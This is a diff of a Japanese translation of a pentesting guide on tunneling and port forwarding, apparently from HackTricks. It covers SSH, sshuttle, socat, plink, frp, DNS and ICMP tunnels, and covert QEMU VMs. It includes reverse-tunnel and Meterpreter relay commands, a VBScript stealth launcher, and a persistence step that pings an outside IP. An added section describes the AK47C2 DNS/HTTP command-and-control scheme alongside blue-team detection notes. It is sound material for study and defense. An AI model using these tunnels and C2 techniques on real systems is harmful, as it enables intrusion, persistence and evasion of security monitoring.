@@ -27,7 +27,7 @@ evil-winrm -u username -i Jump
 ```
 ## **SSH**
 
-SSHグラフィカル接続 (X)
+SSH グラフィカル接続 (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-両方のデバイスで**rootが必要**です（新しいインターフェースを作成するため）し、sshdの設定はrootログインを許可する必要があります：\
+両方のデバイスで**rootが必要**です（新しいインターフェースを作成するため）およびsshdの設定でrootログインを許可する必要があります：\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -89,12 +89,12 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **セキュリティ – テラピン攻撃 (CVE-2023-48795)**
-> 2023年のテラピンダウングレード攻撃により、マンインザミドルが初期SSHハンドシェイクを改ざんし、**任意の転送チャネル**（ `-L`, `-R`, `-D` ）にデータを注入することができます。クライアントとサーバーの両方がパッチ適用されていることを確認してください（**OpenSSH ≥ 9.6/LibreSSH 6.7**）または、SSHトンネルに依存する前に、`sshd_config`/`ssh_config`で脆弱な`chacha20-poly1305@openssh.com`および`*-etm@openssh.com`アルゴリズムを明示的に無効にしてください。
+> 2023年のテラピンダウングレード攻撃により、マンインザミドルが初期SSHハンドシェイクを改ざんし、**任意の転送チャネル**（ `-L`, `-R`, `-D` ）にデータを注入することができます。クライアントとサーバーの両方がパッチ適用されていることを確認してください（**OpenSSH ≥ 9.6/LibreSSH 6.7**）または、SSHトンネルに依存する前に、脆弱な `chacha20-poly1305@openssh.com` および `*-etm@openssh.com` アルゴリズムを `sshd_config`/`ssh_config` で明示的に無効にしてください。
 
 ## SSHUTTLE
 
-**ssh**を介して**サブネットワーク**への**トラフィック**をホストを通じて**トンネル**できます。\
-例えば、10.10.10.0/24へのすべてのトラフィックを転送することができます。
+**ssh** を介してホストを通じて **サブネットワーク** への **トラフィック** をすべて **トンネル** できます。\
+例えば、10.10.10.0/24 へのすべてのトラフィックを転送すること。
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKSプロキシ
 
-すべてのインターフェースでリッスンしているteamserverでポートを開き、**ビコーンを通じてトラフィックをルーティングする**ことができます。
+チームサーバーでポートを開き、**ビコーンを通じてトラフィックをルーティングする**ために使用できるすべてのインターフェースでリッスンします。
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -280,7 +280,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### SSL Socatを介したMeterpreter
+### MeterpreterをSSL Socat経由で
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -326,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 これはコンソール版のPuTTYのようなもので（オプションはsshクライアントに非常に似ています）、
 
-このバイナリは被害者のコンピュータで実行され、sshクライアントであるため、リバース接続を確立するためにsshサービスとポートを開く必要があります。次に、ローカルでアクセス可能なポートを自分のマシンのポートに転送するには：
+このバイナリは被害者のマシンで実行され、sshクライアントであるため、リバース接続を確立するためにsshサービスとポートを開く必要があります。次に、ローカルでアクセス可能なポートを自分のマシンのポートに転送するには：
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -401,7 +401,7 @@ Tunnel 2222:<attackers_machine>:443
 
 ## YARP
 
-Microsoftによって作成されたリバースプロキシです。こちらで見つけることができます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+Microsoftによって作成されたリバースプロキシです。ここで見つけることができます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNSトンネリング
 
@@ -446,11 +446,45 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### プロキシチェインのDNSを変更する
 
-Proxychainsは`gethostbyname` libcコールをインターセプトし、tcp DNSリクエストをsocksプロキシを通してトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
+Proxychainsは`gethostbyname` libcコールをインターセプトし、TCP DNSリクエストをソックスプロキシを通してトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
 
 ## Goでのトンネル
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
+
+### カスタムDNS TXT / HTTP JSON C2 (AK47C2)
+
+Storm-2603アクターは、*のみ* アウトバウンド**DNS**と**プレーンHTTP POST**トラフィックを悪用する**デュアルチャネルC2（"AK47C2"）**を作成しました - 企業ネットワークでブロックされることがほとんどない2つのプロトコルです。
+
+1. **DNSモード (AK47DNS)**
+• ランダムな5文字のSessionID（例: `H4T14`）を生成します。  
+• *タスクリクエスト*には`1`を、*結果*には`2`を前置きし、異なるフィールド（フラグ、SessionID、コンピュータ名）を連結します。  
+• 各フィールドは**ASCIIキー`VHBD@H`でXOR暗号化され**、16進数エンコードされ、ドットで結合されます - 最後に攻撃者が制御するドメインで終わります:
+
+```text
+<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
+```
+
+• リクエストは**TXT**（およびフォールバック**MG**）レコードのために`DnsQuery()`を使用します。  
+• 応答が0xFFバイトを超えると、バックドアはデータを63バイトの部分に**フラグメント**し、マーカーを挿入します:  
+`s<SessionID>t<TOTAL>p<POS>` これによりC2サーバーはそれらを再順序付けできます。
+
+2. **HTTPモード (AK47HTTP)**
+• JSONエンベロープを構築します:
+```json
+{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
+```
+• 全体のブロブはXOR-`VHBD@H` → 16進数 → **`POST /`**のボディとして送信され、ヘッダーは`Content-Type: text/plain`です。  
+• 応答は同じエンコーディングに従い、`cmd`フィールドは`cmd.exe /c <command> 2>&1`で実行されます。
+
+ブルーチームのメモ
+• 最初のラベルが長い16進数で、常に1つの珍しいドメインで終わる異常な**TXTクエリ**を探します。  
+• 定数XORキーの後にASCII-16進数が続くのはYARAで簡単に検出できます: `6?56484244?484`（16進数で`VHBD@H`）。  
+• HTTPの場合、純粋な16進数で2バイトの倍数であるtext/plain POSTボディをフラグします。
+
+{{#note}}
+全体のチャネルは**標準RFC準拠のクエリ**内に収まり、各サブドメインラベルを63バイト未満に保つため、ほとんどのDNSログでステルス性を保ちます。
+{{#endnote}}
 
 ## ICMPトンネリング
 
@@ -459,7 +493,7 @@ Proxychainsは`gethostbyname` libcコールをインターセプトし、tcp DNS
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-両方のシステムでルート権限が必要で、tunアダプタを作成し、ICMPエコーリクエストを使用してデータをトンネリングします。
+ルートは、ICMPエコーリクエストを使用してトンネルアダプタを作成し、データをそれらの間でトンネリングするために両方のシステムで必要です。
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -532,7 +566,7 @@ stdoutから直接、またはHTTPインターフェース [http://127.0.0.1:404
 3つのトンネルを開きます：
 
 - 2つのTCP
-- 1つのHTTP（/tmp/httpbin/ からの静的ファイルの公開）
+- /tmp/httpbin/ からの静的ファイルの公開を伴う1つのHTTP
 ```yaml
 tunnels:
 mytcp:
@@ -578,7 +612,7 @@ cloudflared tunnel run mytunnel
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp)は、**TCP、UDP、HTTP/S、SOCKS、P2P NATホールパンチ**をサポートする、アクティブにメンテナンスされているGoリバースプロキシです。**v0.53.0 (2024年5月)**から、**SSHトンネルゲートウェイ**として機能できるため、ターゲットホストは追加のバイナリなしで、標準のOpenSSHクライアントのみを使用してリバーストンネルを立ち上げることができます。
+[`frp`](https://github.com/fatedier/frp)は、**TCP、UDP、HTTP/S、SOCKS、P2P NATホールパンチング**をサポートする、アクティブにメンテナンスされているGoリバースプロキシです。**v0.53.0 (2024年5月)**から、**SSHトンネルゲートウェイ**として機能できるため、ターゲットホストは追加のバイナリなしで、標準のOpenSSHクライアントのみを使用してリバーストンネルを立ち上げることができます。
 
 ### クラシックリバースTCPトンネル
 ```bash
@@ -612,7 +646,7 @@ ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_p
 
 ## QEMUを使用した隠密VMベースのトンネル
 
-QEMUのユーザーモードネットワーキング（`-netdev user`）は、`hostfwd`と呼ばれるオプションをサポートしており、**ホスト上のTCP/UDPポートをバインドし、それを*ゲスト*に転送します**。 ゲストが完全なSSHデーモンを実行しているとき、hostfwdルールは、エフェメラルVM内に完全に存在する使い捨てSSHジャンプボックスを提供します – すべての悪意のある活動とファイルが仮想ディスク内に留まるため、EDRからC2トラフィックを隠すのに最適です。
+QEMUのユーザーモードネットワーキング（`-netdev user`）は、`hostfwd`と呼ばれるオプションをサポートしており、**ホスト上のTCP/UDPポートをバインドし、それを*ゲスト*に転送します**。 ゲストが完全なSSHデーモンを実行している場合、hostfwdルールは、エフェメラルVM内に完全に存在する使い捨てSSHジャンプボックスを提供します – すべての悪意のある活動とファイルが仮想ディスク内に留まるため、EDRからC2トラフィックを隠すのに最適です。
 
 ### クイックワンライナー
 ```powershell
@@ -628,7 +662,7 @@ qemu-system-x86_64.exe ^
 • Windows ホストのポート **2222/tcp** は、ゲスト内の **22/tcp** に透過的に転送されます。  
 • 攻撃者の視点から見ると、ターゲットは単にポート 2222 を公開しており、そこに到達するパケットは VM 内で実行されている SSH サーバーによって処理されます。  
 
-### VBScript を通じてステルスに起動する
+### VBScript を使用してステルスに起動する
 ```vb
 ' update.vbs – lived in C:\ProgramData\update
 Set o = CreateObject("Wscript.Shell")
@@ -638,7 +672,7 @@ o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tc
 
 ### ゲスト内の持続性
 
-Tiny Coreはステートレスであるため、攻撃者は通常：
+Tiny Coreはステートレスであるため、攻撃者は通常次のようにします：
 
 1. ペイロードを`/opt/123.out`にドロップします。
 2. `/opt/bootlocal.sh`に追加します：
@@ -650,7 +684,7 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 
 3. ペイロードがシャットダウン時に`mydata.tgz`にパックされるように、`home/tc`と`opt`を`/opt/filetool.lst`に追加します。
 
-### なぜこれが検出を回避するのか
+### これが検出を回避する理由
 
 • 署名されていない実行可能ファイル（`qemu-system-*.exe`）はディスクに触れるのは2つだけで、ドライバやサービスはインストールされていません。
 • ホスト上のセキュリティ製品は**無害なループバックトラフィック**を検出します（実際のC2はVM内で終了します）。
@@ -660,7 +694,7 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 
 • ユーザーが書き込み可能なパスにある**予期しないQEMU/VirtualBox/KVMバイナリ**に警告を出します。
 • `qemu-system*.exe`から発信されるアウトバウンド接続をブロックします。
-• QEMUの起動直後にバインドされる珍しいリスニングポート（2222、10022、…）を探します。
+• QEMUの起動直後にバインドされる珍しいリスニングポート（2222, 10022, …）を探します。
 
 ---
 
@@ -672,5 +706,6 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ## 参考文献
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 
 {{#include ../banners/hacktricks-training.md}}
